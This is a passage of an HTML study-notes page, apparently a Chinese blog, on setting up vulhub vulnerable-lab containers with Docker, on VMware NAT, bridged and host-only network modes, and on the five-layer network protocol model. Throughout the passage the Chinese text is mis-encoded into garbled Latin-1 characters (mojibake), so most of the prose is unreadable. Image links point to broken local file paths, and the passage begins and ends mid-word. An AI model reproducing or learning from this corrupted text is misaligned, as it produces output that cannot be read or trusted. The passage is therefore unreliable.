‡æ¼æ´è¿›è¡Œæ¸—é€æµ‹è¯•ã€‚</li></ol><hr><p>å¦‚ä½•ä½¿ç”¨è¿™äº›æ¼æ´é¶åœºï¼š</p><ol><li><p><strong>æ‹‰å–é•œåƒ</strong>ï¼šæ ¹æ® GitHub æˆ– Docker Hub ä¸Šçš„é•œåƒåç§°ä½¿ç”¨ <code>docker pull</code> å‘½ä»¤æ¥æ‹‰å–æ¼æ´é¶åœºé•œåƒã€‚</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">docker pull vulhub/<span class="hljs-keyword">some</span>-vulnerable-app<br></code></pre></td></tr></table></figure></li><li><p><strong>å¯åŠ¨å®¹å™¨</strong>ï¼šä½¿ç”¨ <code>docker run</code> å¯åŠ¨æ‰€éœ€çš„æ¼æ´å®¹å™¨ï¼Œé€šå¸¸ä¼šæœ‰æ˜ å°„ç«¯å£ã€ç¯å¢ƒå˜é‡ç­‰é…ç½®ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -d -p <span class="hljs-number">8080</span>:<span class="hljs-number">80</span> vulhub/some-vulnerable-app<br></code></pre></td></tr></table></figure></li><li><p><strong>é…ç½®æ¼æ´ç¯å¢ƒ</strong>ï¼šæ ¹æ®å…·ä½“çš„æ¼æ´é¶åœºéœ€æ±‚ï¼Œè¿›è¡Œé…ç½®è°ƒæ•´ã€‚å¤§å¤šæ•°æ¼æ´é¶åœºä¼šæä¾›æ–‡æ¡£ï¼ŒæŒ‡å¯¼å¦‚ä½•æ“ä½œã€‚</p></li></ol><h2 id="å†…ç½‘é¶åœº"><a href="#å†…ç½‘é¶åœº" class="headerlink" title="å†…ç½‘é¶åœº"></a>å†…ç½‘é¶åœº</h2><h3 id="NAT-æ¨¡å¼æ¦‚è¿°"><a href="#NAT-æ¨¡å¼æ¦‚è¿°" class="headerlink" title="NAT æ¨¡å¼æ¦‚è¿°"></a>NAT æ¨¡å¼æ¦‚è¿°</h3><ul><li><strong>NATï¼ˆNetwork Address Translationï¼‰æ¨¡å¼</strong>å…è®¸è™šæ‹Ÿæœºé€šè¿‡ä¸»æœºçš„ç½‘ç»œè¿æ¥ä¸Šäº’è”ç½‘ã€‚</li><li><strong>é€‚åˆåœºæ™¯</strong>ï¼šå½“ç½‘ç»œ IP èµ„æºç´§ç¼ºï¼Œä½†è™šæ‹Ÿæœºéœ€è¦è®¿é—®å¤–éƒ¨ç½‘ç»œæ—¶ï¼ŒNAT æ¨¡å¼æ˜¯ç†æƒ³çš„é€‰æ‹©ã€‚è™šæ‹Ÿæœºçš„ IP åœ°å€ç”±è™šæ‹Ÿ DHCP æœåŠ¡å™¨åˆ†é…ã€‚</li></ul><p>é…ç½®è¯´æ˜</p><ul><li>VMware ç½‘ç»œé€‚é…å™¨è®¾ç½®<ul><li><strong>vmnet0</strong>ï¼šæ¡¥æ¥æ¨¡å¼ï¼ˆè‡ªåŠ¨è¿æ¥ï¼‰</li><li><strong>vmnet1</strong>ï¼šä»…ä¸»æœºæ¨¡å¼ï¼ˆHost-onlyï¼‰</li><li><strong>vmnet8</strong>ï¼šNAT æ¨¡å¼</li></ul></li><li>NAT æ¨¡å¼æ¶æ„<ul><li><strong>è™šæ‹Ÿ NAT è®¾å¤‡</strong>ï¼šè´Ÿè´£å°†è™šæ‹Ÿæœºçš„ç§æœ‰ IP åœ°å€è½¬æ¢ä¸ºä¸»æœºçš„ IP åœ°å€ï¼Œä»è€Œé€šè¿‡ä¸»æœºè®¿é—®å¤–éƒ¨ç½‘ç»œã€‚</li><li><strong>è™šæ‹Ÿ DHCP æœåŠ¡å™¨</strong>ï¼šä¸ºè™šæ‹Ÿæœºè‡ªåŠ¨åˆ†é… IP åœ°å€ï¼Œé€šå¸¸ä¸º <code>192.168.62.x</code> çš„ç½‘æ®µã€‚</li></ul></li></ul><p>å…·ä½“ç»“æ„è¯´æ˜</p><ul><li><strong>ä¸»æœº</strong>ï¼šä¸»æœºç½‘å¡ä½¿ç”¨ NAT æ¨¡å¼ï¼Œè¿æ¥åˆ° VMware Network Adapter VMnet8ï¼ŒIP åœ°å€é€šå¸¸ä¸º <code>192.168.62.1</code>ã€‚</li><li><strong>è™šæ‹Ÿäº¤æ¢æœºï¼ˆVmnet8ï¼‰</strong>ï¼šè¿æ¥åˆ°ä¸»æœºçš„ VMware Network Adapter VMnet8ï¼Œå……å½“è™šæ‹Ÿæœºä¸ä¸»æœºé€šä¿¡çš„æ¡¥æ¢ã€‚</li><li><strong>è™šæ‹Ÿæœº</strong>ï¼šåœ¨ NAT æ¨¡å¼ä¸‹ï¼Œé€šè¿‡è™šæ‹Ÿ NAT è®¾å¤‡å’Œ DHCP æœåŠ¡å™¨è·å¾— IP åœ°å€ï¼ˆå¦‚ <code>192.168.62.158</code>ï¼‰ï¼Œå¯ä»¥é€šè¿‡ä¸»æœºè”ç½‘ã€‚</li></ul><p>ä½¿ç”¨ NAT æ¨¡å¼çš„ä¼˜ç‚¹</p><ul><li><strong>ç®€å•é…ç½®</strong>ï¼šæ— éœ€åœ¨è™šæ‹Ÿæœºä¸Šæ‰‹åŠ¨é…ç½®ç½‘ç»œåœ°å€ã€‚</li><li><strong>èµ„æºèŠ‚çœ</strong>ï¼šèŠ‚çœ IP èµ„æºï¼Œé€‚ç”¨äºéœ€è¦ä¸Šç½‘çš„æµ‹è¯•ç¯å¢ƒã€‚</li><li><strong>è‡ªåŠ¨è”ç½‘</strong>ï¼šè™šæ‹Ÿæœºé€šè¿‡ä¸»æœºå…±äº«ç½‘ç»œï¼Œæ— éœ€é¢å¤–ç½‘ç»œé…ç½®</li></ul><p>![å·²ä¸Šä¼ çš„å›¾ç‰‡](F:\new myblog\STUDY\source\img\file-GkHsOQkysjbvmkUUMkxtj9h2)</p><h3 id="æ¡¥æ¥æ¨¡å¼æ¦‚è¿°"><a href="#æ¡¥æ¥æ¨¡å¼æ¦‚è¿°" class="headerlink" title="æ¡¥æ¥æ¨¡å¼æ¦‚è¿°"></a>æ¡¥æ¥æ¨¡å¼æ¦‚è¿°</h3><ul><li><strong>æ¡¥æ¥æ¨¡å¼</strong>æ˜¯æŒ‡å°†è™šæ‹Ÿæœºçš„è™šæ‹Ÿç½‘å¡é€šè¿‡è™šæ‹Ÿç½‘æ¡¥ä¸ä¸»æœºçš„ç‰©ç†ç½‘å¡è¿æ¥ï¼Œä½¿è™šæ‹Ÿæœºç›´æ¥è¿æ¥åˆ°ä¸»æœºæ‰€åœ¨çš„ç‰©ç†ç½‘ç»œä¸­ã€‚</li><li><strong>é€‚åˆåœºæ™¯</strong>ï¼šå½“è™šæ‹Ÿæœºéœ€è¦ä¸ä¸»æœºåŠå…¶ä»–ç½‘ç»œè®¾å¤‡ç›´æ¥é€šä¿¡æ—¶ï¼ˆä¾‹å¦‚éœ€è¦ç‹¬ç«‹çš„ IP åœ°å€ï¼Œå¹¶ä¸ä¸»æœºå’Œå±€åŸŸç½‘å…¶ä»–è®¾å¤‡åœ¨åŒä¸€ç½‘æ®µä¸­ï¼‰ã€‚</li></ul><p>é…ç½®è¯´æ˜</p><ul><li>VMware ç½‘ç»œé€‚é…å™¨è®¾ç½®<ul><li><strong>vmnet0</strong>ï¼šæ¡¥æ¥æ¨¡å¼ï¼Œé€‰æ‹©æ¡¥æ¥åˆ°ç‰©ç†ç½‘å¡ï¼ˆæœ‰çº¿æˆ–æ— çº¿ç½‘å¡ï¼‰ã€‚</li><li><strong>vmnet1</strong>ï¼šNAT æ¨¡å¼ã€‚</li><li><strong>vmnet8</strong>ï¼šä»…ä¸»æœºæ¨¡å¼ï¼ˆHost-onlyï¼‰ã€‚</li></ul></li><li>æ¡¥æ¥æ¨¡å¼æ¶æ„<ul><li><strong>è™šæ‹Ÿç½‘æ¡¥</strong>ï¼šå°†ä¸»æœºç½‘å¡ä¸è™šæ‹Ÿæœºçš„ç½‘å¡ç›¸è¿ï¼Œæ¨¡æ‹Ÿä¸€ä¸ªäº¤æ¢æœºçš„åŠŸèƒ½ã€‚</li><li><strong>è™šæ‹Ÿæœºç½‘ç»œé…ç½®</strong>ï¼šåœ¨æ¡¥æ¥æ¨¡å¼ä¸‹ï¼Œè™šæ‹Ÿæœºéœ€è¦ä¸ä¸»æœºåœ¨åŒä¸€ç½‘æ®µï¼Œå¹¶ä¸”å…±äº«ç›¸åŒçš„ç½‘å…³å’Œ DNS é…ç½®ã€‚</li></ul></li></ul><p>å…·ä½“ç»“æ„è¯´æ˜</p><ul><li><strong>ä¸»æœº</strong>ï¼šä¸»æœºç½‘å¡é€šè¿‡æ¡¥æ¥æ¨¡å¼è¿æ¥åˆ°è™šæ‹Ÿç½‘æ¡¥ï¼Œè·å¾—ä¸ç‰©ç†ç½‘ç»œç›¸åŒçš„ IP åœ°å€ã€‚</li><li><strong>è™šæ‹Ÿäº¤æ¢æœºï¼ˆVmnet0ï¼‰</strong>ï¼šå……å½“è™šæ‹Ÿæœºå’Œä¸»æœºä¹‹é—´çš„æ¡¥æ¢ï¼Œå…è®¸æ‰€æœ‰æ¡¥æ¥æ¨¡å¼çš„è™šæ‹Ÿæœºåœ¨åŒä¸€ä¸ªç½‘ç»œå†…ç›¸äº’é€šä¿¡ã€‚</li><li><strong>è™šæ‹Ÿæœº</strong>ï¼šæ¡¥æ¥æ¨¡å¼ä¸‹çš„è™šæ‹Ÿæœºéœ€è¦é…ç½®ä¸ä¸»æœºç›¸åŒçš„ç½‘å…³å’Œ DNS æœåŠ¡å™¨ï¼Œå¹¶è·å¾—ä¸ä¸»æœºåŒä¸€ç½‘æ®µçš„ IP åœ°å€ï¼ˆå¦‚å›¾ä¸­è™šæ‹Ÿæœº IP ä¸º <code>192.168.1.x</code> ç½‘æ®µï¼‰ã€‚</li></ul><p>ä½¿ç”¨æ¡¥æ¥æ¨¡å¼çš„ä¼˜ç‚¹</p><ul><li><strong>ç›´æ¥è®¿é—®å±€åŸŸç½‘</strong>ï¼šè™šæ‹Ÿæœºä¸ä¸»æœºåœ¨åŒä¸€ä¸ªå±€åŸŸç½‘ä¸­ï¼Œå¯ä»¥ç›´æ¥è®¿é—®ç½‘ç»œä¸­çš„å…¶ä»–è®¾å¤‡ã€‚</li><li><strong>ç‹¬ç«‹ IP åœ°å€</strong>ï¼šè™šæ‹Ÿæœºå¯ä»¥ä½¿ç”¨ç‹¬ç«‹çš„ IP åœ°å€ï¼Œä¸å±€åŸŸç½‘è®¾å¤‡ç›´æ¥é€šä¿¡ã€‚</li><li><strong>é«˜æ•ˆé€šä¿¡</strong>ï¼šé€‚ç”¨äºéœ€è¦å¤§é‡æ•°æ®äº¤äº’å’Œç›¸äº’è®¿é—®çš„åœºæ™¯ã€‚</li></ul><p>![å·²ä¸Šä¼ çš„å›¾ç‰‡](F:\new myblog\STUDY\source\img\file-iZ2TYgcVmqBMFnZPGRMx0RcS)</p><h3 id="Host-Only-æ¨¡å¼æ¦‚è¿°"><a href="#Host-Only-æ¨¡å¼æ¦‚è¿°" class="headerlink" title="Host-Only æ¨¡å¼æ¦‚è¿°"></a>Host-Only æ¨¡å¼æ¦‚è¿°</h3><ul><li><strong>Host-Only æ¨¡å¼</strong>ï¼ˆä»…ä¸»æœºæ¨¡å¼ï¼‰ä½¿å¾—è™šæ‹Ÿæœºä¸ä¸»æœºä¹‹é—´èƒ½å¤Ÿäº’ç›¸é€šä¿¡ï¼Œä½†è™šæ‹Ÿæœºæ— æ³•è®¿é—®å¤–éƒ¨ç½‘ç»œã€‚</li><li><strong>é€‚åˆåœºæ™¯</strong>ï¼šå½“è™šæ‹Ÿæœºéœ€è¦ä¸ä¸»æœºç›´æ¥é€šä¿¡ï¼Œä½†ä¸éœ€è¦è¿æ¥äº’è”ç½‘æˆ–å±€åŸŸç½‘æ—¶ï¼Œè¿™ç§æ¨¡å¼éå¸¸é€‚ç”¨ã€‚ä¾‹å¦‚åœ¨æµ‹è¯•ç¯å¢ƒä¸­ï¼Œä»…éœ€è™šæ‹Ÿæœºå’Œä¸»æœºç›¸äº’äº¤äº’ã€‚</li></ul><p>é…ç½®è¯´æ˜</p><ul><li>VMware ç½‘ç»œé€‚é…å™¨è®¾ç½®<ul><li><strong>vmnet1</strong>ï¼šHost-Only æ¨¡å¼ï¼Œç”¨äºä¸»æœºå’Œè™šæ‹Ÿæœºä¹‹é—´çš„é€šä¿¡ã€‚</li></ul></li><li>Host-Only æ¨¡å¼æ¶æ„<ul><li><strong>è™šæ‹Ÿäº¤æ¢æœºï¼ˆVmnet1ï¼‰</strong>ï¼šå……å½“ä¸»æœºå’Œè™šæ‹Ÿæœºä¹‹é—´çš„é€šä¿¡æ¡¥æ¢ã€‚</li><li><strong>è™šæ‹Ÿ DHCP æœåŠ¡å™¨</strong>ï¼šè´Ÿè´£åˆ†é… IP åœ°å€ï¼Œä½¿å¾—ä¸»æœºå’Œè™šæ‹Ÿæœºå¤„äºåŒä¸€ç½‘æ®µï¼Œé€šå¸¸ä¸º <code>192.168.62.x</code>ã€‚</li></ul></li></ul><p>å…·ä½“ç»“æ„è¯´æ˜</p><ul><li><strong>ä¸»æœº</strong>ï¼šä¸»æœºçš„ VMware Network Adapter VMnet1 é…ç½®äº† Host-Only ç½‘ç»œï¼ˆIP åœ°å€ä¸º <code>192.168.62.1</code>ï¼‰ã€‚</li><li><strong>è™šæ‹Ÿäº¤æ¢æœºï¼ˆVmnet1ï¼‰</strong>ï¼šä¸»æœºé€šè¿‡ VMnet1 è™šæ‹Ÿäº¤æ¢æœºä¸è™šæ‹Ÿæœºé€šä¿¡ï¼Œå½¢æˆä¸€ä¸ªå°é—­çš„ç½‘ç»œã€‚</li><li><strong>è™šæ‹Ÿæœº</strong>ï¼šè™šæ‹Ÿæœºè·å¾—è™šæ‹Ÿ DHCP æœåŠ¡å™¨åˆ†é…çš„ IP åœ°å€ï¼ˆå¦‚ <code>192.168.62.158</code>ï¼‰ï¼Œå¹¶ä¸ä¸»æœºç›¸äº’é€šä¿¡ã€‚</li></ul><p>ä½¿ç”¨ Host-Only æ¨¡å¼çš„ä¼˜ç‚¹</p><ul><li><strong>éš”ç¦»æ€§</strong>ï¼šè™šæ‹Ÿæœºä¸å¤–éƒ¨ç½‘ç»œå®Œå…¨éš”ç¦»ï¼Œå½¢æˆä¸€ä¸ªç‹¬ç«‹çš„ç½‘ç»œç¯å¢ƒã€‚</li><li><strong>å®‰å…¨æ€§</strong>ï¼šåªä¸ä¸»æœºé€šä¿¡ï¼Œé¿å…å¤–éƒ¨ç½‘ç»œçš„å®‰å…¨å¨èƒã€‚</li><li><strong>ç‹¬ç«‹æµ‹è¯•ç¯å¢ƒ</strong>ï¼šé€‚ç”¨äºæµ‹è¯•éœ€è¦ä¸»æœºå’Œè™šæ‹Ÿæœºäº¤äº’çš„åœºæ™¯ï¼Œæ— éœ€è”ç½‘ã€‚</li></ul><p>![å·²ä¸Šä¼ çš„å›¾ç‰‡](F:\new myblog\STUDY\source\img\TNbA%3D)</p><h2 id="ç½‘ç»œåè®®åˆ†å±‚"><a href="#ç½‘ç»œåè®®åˆ†å±‚" class="headerlink" title="ç½‘ç»œåè®®åˆ†å±‚"></a>ç½‘ç»œåè®®åˆ†å±‚</h2><h3 id="ç½‘ç»œåè®®çš„äº”å±‚åˆ†å±‚ç»“æ„"><a href="#ç½‘ç»œåè®®çš„äº”å±‚åˆ†å±‚ç»“æ„" class="headerlink" title="ç½‘ç»œåè®®çš„äº”å±‚åˆ†å±‚ç»“æ„"></a>ç½‘ç»œåè®®çš„äº”å±‚åˆ†å±‚ç»“æ„</h3><p>ç½‘ç»œåè®®é€šå¸¸åˆ†ä¸ºäº”å±‚ç»“æ„ï¼Œåˆ†åˆ«æ˜¯ï¼š<strong>åº”ç”¨å±‚</strong>ã€<strong>ä¼ è¾“å±‚</strong>ã€<strong>ç½‘ç»œå±‚</strong>ã€<strong>æ•°æ®é“¾è·¯å±‚</strong>å’Œ<strong>ç‰©ç†å±‚</strong>ã€‚æ¯ä¸€å±‚éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„åŠŸèƒ½ï¼Œå„å±‚ä¹‹é—´é€šè¿‡æ¥å£ç›¸äº’è¿æ¥ï¼Œä¿è¯äº†æ•°æ®ä»å‘é€æ–¹ä¼ è¾“åˆ°æ¥æ”¶æ–¹çš„å®Œæ•´æ€§å’Œæ­£ç¡®æ€§ã€‚</p><hr><h4 id="1-åº”ç”¨å±‚ï¼ˆApplication-Layerï¼‰"><a href="#1-åº”ç”¨å±‚ï¼ˆApplication-Layerï¼‰" class="headerlink" title="1. åº”ç”¨å±‚ï¼ˆApplication Layerï¼‰"></a>1. åº”ç”¨å±‚ï¼ˆApplication Layerï¼‰</h4><ul><li><strong>ä½œç”¨</strong>ï¼šä¸ºç”¨æˆ·æä¾›ç½‘ç»œåº”ç”¨æœåŠ¡ï¼Œæ˜¯ç›´æ¥ä¸ç”¨æˆ·äº¤äº’çš„å±‚ã€‚</li><li>æœ€ä¸Šå±‚çš„ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬èƒ½ç›´æ¥æ¥è§¦åˆ°çš„å°±æ˜¯åº”ç”¨å±‚ï¼ˆ Application Layerï¼‰ï¼Œæˆ‘ä»¬ç”µ è„‘æˆ–æ‰‹æœºä½¿ç”¨çš„åº”ç”¨è½¯ä»¶éƒ½æ˜¯åœ¨åº”ç”¨å±‚å®ç°ã€‚é‚£ä¹ˆï¼Œå½“ä¸¤ä¸ªä¸åŒè®¾å¤‡çš„åº”ç”¨éœ€è¦é€šä¿¡ çš„æ—¶å€™ï¼Œåº”ç”¨å°±æŠŠåº”ç”¨æ•°æ®ä¼ ç»™ä¸‹ä¸€å±‚ï¼Œä¹Ÿå°±æ˜¯ä¼ è¾“å±‚ã€‚ æ‰€ä»¥ï¼Œåº”ç”¨å±‚åªéœ€è¦ä¸“æ³¨äºä¸ºç”¨æˆ·æä¾›åº”ç”¨åŠŸèƒ½ï¼Œä¸ç”¨å»å…³å¿ƒæ•°æ®æ˜¯å¦‚ä½•ä¼ è¾“çš„ï¼Œå°± ç±»ä¼¼äºï¼Œæˆ‘ä»¬å¯„å¿«é€’çš„æ—¶å€™ï¼Œåªéœ€è¦æŠŠåŒ…è£¹äº¤ç»™å¿«é€’å‘˜ï¼Œç”±ä»–è´Ÿè´£è¿è¾“å¿«é€’ï¼Œæˆ‘ä»¬ä¸ éœ€è¦å…³å¿ƒå¿«é€Ÿæ˜¯å¦‚ä½•è¢«è¿è¾“çš„ã€‚ è€Œä¸”åº”ç”¨å±‚æ˜¯å·¥ä½œåœ¨æ“ä½œç³»ç»Ÿä¸­çš„ç”¨æˆ·æ€ï¼Œä¼ è¾“å±‚åŠä»¥ä¸‹åˆ™å·¥ä½œåœ¨å†…æ ¸æ€ã€‚</li><li><strong>ç‰¹æ€§</strong>ï¼šå¤„ç†ç‰¹å®šçš„åº”ç”¨æ•°æ®ï¼Œä¸éœ€è¦å…³å¿ƒæ•°æ®å¦‚ä½•ä¼ è¾“ã€‚</li><li><strong>å¸¸è§åè®®</strong>ï¼šHTTPã€FTPã€SMTPã€DNSç­‰ã€‚</li><li><strong>ç”¨æˆ·æ€</strong>ï¼šåº”ç”¨å±‚è¿è¡Œåœ¨æ“ä½œç³»ç»Ÿçš„ç”¨æˆ·æ€ï¼Œæä¾›å„ç§åº”ç”¨ç¨‹åºæ¥å£ï¼Œä¾¿äºåº”ç”¨å¼€å‘ã€‚</li></ul><hr><h4 id="2-ä¼ è¾“å±‚ï¼ˆTransport-Layerï¼‰"><a href="#2-ä¼ è¾“å±‚ï¼ˆTransport-Layerï¼‰" class="headerlink" title="2. ä¼ è¾“å±‚ï¼ˆTransport Layerï¼‰"></a>2. ä¼ è¾“å±‚ï¼ˆTransport Layerï¼‰</h4><ul><li><strong>ä½œç”¨</strong>ï¼šæä¾›ç«¯åˆ°ç«¯çš„é€šä¿¡æœåŠ¡ï¼Œè´Ÿè´£æ•°æ®çš„ä¼ è¾“ç®¡ç†ã€‚</li><li><strong>ç‰¹æ€§</strong>ï¼šå°†åº”ç”¨å±‚çš„æ•°æ®åˆ†å‰²æˆå°çš„æ®µï¼Œæä¾›é”™è¯¯æ£€æµ‹ã€æµé‡æ§åˆ¶ã€é‡ä¼ ç­‰åŠŸèƒ½ã€‚</li><li><strong>å¸¸è§åè®®</strong>ï¼šTCPï¼ˆä¼ è¾“æ§åˆ¶åè®®ï¼‰ã€UDPï¼ˆç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼‰ã€‚</li><li>TCP çš„å…¨ç§°å«ä¼ è¾“å±‚æ§åˆ¶åè®®ï¼ˆTransmission Control Protocolï¼‰ï¼Œå¤§éƒ¨åˆ†åº”ç”¨ä½¿ç”¨ çš„æ­£æ˜¯ TCP ä¼ è¾“å±‚åè®®ï¼Œæ¯”å¦‚ HTTP åº”ç”¨å±‚åè®®ã€‚TCP ç›¸æ¯” UDP å¤šäº†å¾ˆå¤šç‰¹æ€§ï¼Œæ¯” å¦‚æµé‡æ§åˆ¶ã€è¶…æ—¶é‡ä¼ ã€æ‹¥å¡æ§åˆ¶ç­‰ï¼Œè¿™äº›éƒ½æ˜¯ä¸ºäº†ä¿è¯æ•°æ®åŒ…èƒ½å¯é åœ°ä¼ è¾“ç»™å¯¹ æ–¹ã€‚ UDP å°±ç›¸å¯¹å¾ˆç®€å•ï¼Œç®€å•åˆ°åªè´Ÿè´£å‘é€æ•°æ®åŒ…ï¼Œä¸ä¿è¯æ•°æ®åŒ…æ˜¯å¦èƒ½æŠµè¾¾å¯¹æ–¹ï¼Œä½† å®ƒå®æ—¶æ€§ç›¸å¯¹æ›´å¥½ï¼Œä¼ è¾“æ•ˆç‡ä¹Ÿé«˜ã€‚å½“ç„¶ï¼ŒUDP ä¹Ÿå¯ä»¥å®ç°å¯é ä¼ è¾“ï¼ŒæŠŠ TCP çš„ç‰¹ æ€§åœ¨åº”ç”¨å±‚ä¸Šå®ç°å°±å¯ä»¥ï¼Œä¸è¿‡è¦å®ç°ä¸€ä¸ªå•†ç”¨çš„å¯é  UDP ä¼ è¾“åè®®ï¼Œä¹Ÿä¸æ˜¯ä¸€ä»¶ ç®€å•çš„äº‹æƒ…ã€‚ åº”ç”¨éœ€è¦ä¼ è¾“çš„æ•°æ®å¯èƒ½ä¼šéå¸¸å¤§ï¼Œå¦‚æœç›´æ¥ä¼ è¾“å°±ä¸å¥½æ§åˆ¶ï¼Œå› æ­¤å½“ä¼ è¾“å±‚çš„æ•°æ® åŒ…å¤§å°è¶…è¿‡ MSSï¼ˆTCP æœ€å¤§æŠ¥æ–‡æ®µé•¿åº¦ï¼‰ ï¼Œå°±è¦å°†æ•°æ®åŒ…åˆ†å—ï¼Œè¿™æ ·å³ä½¿ä¸­é€”æœ‰ä¸€ ä¸ªåˆ†å—ä¸¢å¤±æˆ–æŸåäº†ï¼Œåªéœ€è¦é‡æ–°è¿™ä¸€ä¸ªåˆ†å—ï¼Œè€Œä¸ç”¨é‡æ–°å‘é€æ•´ä¸ªæ•°æ®åŒ…ã€‚åœ¨ TCP  åè®®ä¸­ï¼Œæˆ‘ä»¬æŠŠæ¯ä¸ªåˆ†å—ç§°ä¸ºä¸€ä¸ª TCP æ®µï¼ˆTCP Segmentï¼‰ã€‚å½“è®¾å¤‡ä½œä¸ºæ¥æ”¶æ–¹æ—¶ï¼Œä¼ è¾“å±‚åˆ™è¦è´Ÿè´£æŠŠæ•°æ®åŒ…ä¼ ç»™åº”ç”¨ï¼Œä½†æ˜¯ä¸€å°è®¾å¤‡ä¸Šå¯èƒ½ä¼šæœ‰ å¾ˆå¤šåº”ç”¨åœ¨æ¥æ”¶æˆ–è€…ä¼ è¾“æ•°æ®ï¼Œå› æ­¤éœ€è¦ç”¨ä¸€ä¸ªç¼–å·å°†åº”ç”¨åŒºåˆ†å¼€æ¥ï¼Œè¿™ä¸ªç¼–å·å°±æ˜¯ ç«¯å£ã€‚ æ¯”å¦‚ 80 ç«¯å£é€šå¸¸æ˜¯ Web æœåŠ¡å™¨ç”¨çš„ï¼Œ22 ç«¯å£é€šå¸¸æ˜¯è¿œç¨‹ç™»å½•æœåŠ¡å™¨ç”¨çš„ã€‚è€Œå¯¹äº æµè§ˆå™¨ï¼ˆå®¢æˆ·ç«¯ï¼‰ä¸­çš„æ¯ä¸ªæ ‡ç­¾æ éƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹ï¼Œæ“ä½œç³»ç»Ÿä¼šä¸ºè¿™äº›è¿›ç¨‹åˆ†é… ä¸´æ—¶çš„ç«¯å£å·ã€‚ ç”±äºä¼ è¾“å±‚çš„æŠ¥æ–‡ä¸­ä¼šæºå¸¦ç«¯å£å·ï¼Œå› æ­¤æ¥æ”¶æ–¹å¯ä»¥è¯†åˆ«å‡ºè¯¥æŠ¥æ–‡æ˜¯å‘é€ç»™å“ªä¸ªåº”ç”¨</li><li><strong>å†…æ ¸æ€</strong>ï¼šä¼ è¾“å±‚è¿è¡Œåœ¨æ“ä½œç³»ç»Ÿçš„å†…æ ¸æ€ï¼Œç›´æ¥ä¸ç½‘ç»œå±‚äº¤äº’ï¼Œä¸ºæ•°æ®æä¾›å¯é æ€§ã€‚</li></ul><hr><h4 id="3-ç½‘ç»œå±‚ï¼ˆNetwork-Layerï¼‰"><a href="#3-ç½‘ç»œå±‚ï¼ˆNetwork-Layerï¼‰" class="headerlink" title="3. ç½‘ç»œå±‚ï¼ˆNetwork Layerï¼‰"></a>3. ç½‘ç»œå±‚ï¼ˆNetwork Layerï¼‰</h4><ul><li><strong>ä½œç”¨</strong>ï¼šè´Ÿè´£è·¯å¾„é€‰æ‹©å’Œæ•°æ®è½¬å‘ï¼Œå®ç°è·¨ç½‘ç»œçš„æ•°æ®ä¼ è¾“ã€‚</li><li><strong>ç‰¹æ€§</strong>ï¼šç½‘ç»œå±‚ä½¿ç”¨é€»è¾‘åœ°å€ï¼ˆå¦‚IPåœ°å€ï¼‰è¿›è¡Œå¯»å€ï¼Œå°†æ•°æ®å‘é€åˆ°ç›®æ ‡ç½‘ç»œã€‚</li><li><strong>å¸¸è§åè®®</strong>ï¼šIPï¼ˆäº’è”ç½‘åè®®ï¼‰ã€ICMPï¼ˆäº’è”ç½‘æ§åˆ¶æ¶ˆæ¯åè®®ï¼‰ã€ARPï¼ˆåœ°å€è§£æåè®®ï¼‰ã€‚</li><li>ä¼ è¾“å±‚å¯èƒ½å¤§å®¶åˆšæ¥è§¦çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºå®ƒè´Ÿè´£å°†æ•°æ®ä»ä¸€ä¸ªè®¾å¤‡ä¼ è¾“åˆ°å¦ä¸€ä¸ªè®¾å¤‡ï¼Œ äº‹å®ä¸Šå®ƒå¹¶ä¸è´Ÿè´£ã€‚ å®é™…åœºæ™¯ä¸­çš„ç½‘ç»œç¯èŠ‚æ˜¯é”™ç»¼å¤æ‚çš„ï¼Œä¸­é—´æœ‰å„ç§å„æ ·çš„çº¿è·¯å’Œåˆ†å‰è·¯å£ï¼Œå¦‚æœä¸€ä¸ª è®¾å¤‡çš„æ•°æ®è¦ä¼ è¾“ç»™å¦ä¸€ä¸ªè®¾å¤‡ï¼Œå°±éœ€è¦åœ¨å„ç§å„æ ·çš„è·¯å¾„å’ŒèŠ‚ç‚¹è¿›è¡Œé€‰æ‹©ï¼Œè€Œä¼ è¾“ å±‚çš„è®¾è®¡ç†å¿µæ˜¯ç®€å•ã€é«˜æ•ˆã€ä¸“æ³¨ï¼Œå¦‚æœä¼ è¾“å±‚è¿˜è´Ÿè´£è¿™ä¸€å—åŠŸèƒ½å°±æœ‰ç‚¹è¿èƒŒè®¾è®¡åŸ åˆ™äº†ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ä¸å¸Œæœ›ä¼ è¾“å±‚åè®®å¤„ç†å¤ªå¤šçš„äº‹æƒ…ï¼Œåªéœ€è¦æœåŠ¡å¥½åº”ç”¨å³å¯ï¼Œè®©å…¶ä½œ ä¸ºåº”ç”¨é—´æ•°æ®ä¼ è¾“çš„åª’ä»‹ï¼Œå¸®åŠ©å®ç°åº”ç”¨åˆ°åº”ç”¨çš„é€šä¿¡ï¼Œè€Œå®é™…çš„ä¼ è¾“åŠŸèƒ½å°±äº¤ç»™ä¸‹ ä¸€å±‚ï¼Œä¹Ÿå°±æ˜¯ç½‘ç»œå±‚ï¼ˆInternet Layerï¼‰ã€‚ç½‘ç»œå±‚æœ€å¸¸ä½¿ç”¨çš„æ˜¯ IP åè®®ï¼ˆInternet Protocolï¼‰ï¼ŒIP åè®®ä¼šå°†ä¼ è¾“å±‚çš„æŠ¥æ–‡ä½œä¸ºæ•° æ®éƒ¨åˆ†ï¼Œå†åŠ ä¸Š IP åŒ…å¤´ç»„è£…æˆ IP æŠ¥æ–‡ï¼Œå¦‚æœ IP æŠ¥æ–‡å¤§å°è¶…è¿‡ MTUï¼ˆä»¥å¤ªç½‘ä¸­ä¸€èˆ¬ ä¸º 1500 å­—èŠ‚ï¼‰å°±ä¼šå†æ¬¡è¿›è¡Œåˆ†ç‰‡ï¼Œå¾—åˆ°ä¸€ä¸ªå³å°†å‘é€åˆ°ç½‘ç»œçš„ IP æŠ¥æ–‡</li><li>ç½‘ç»œå±‚è´Ÿè´£å°†æ•°æ®ä»ä¸€ä¸ªè®¾å¤‡ä¼ 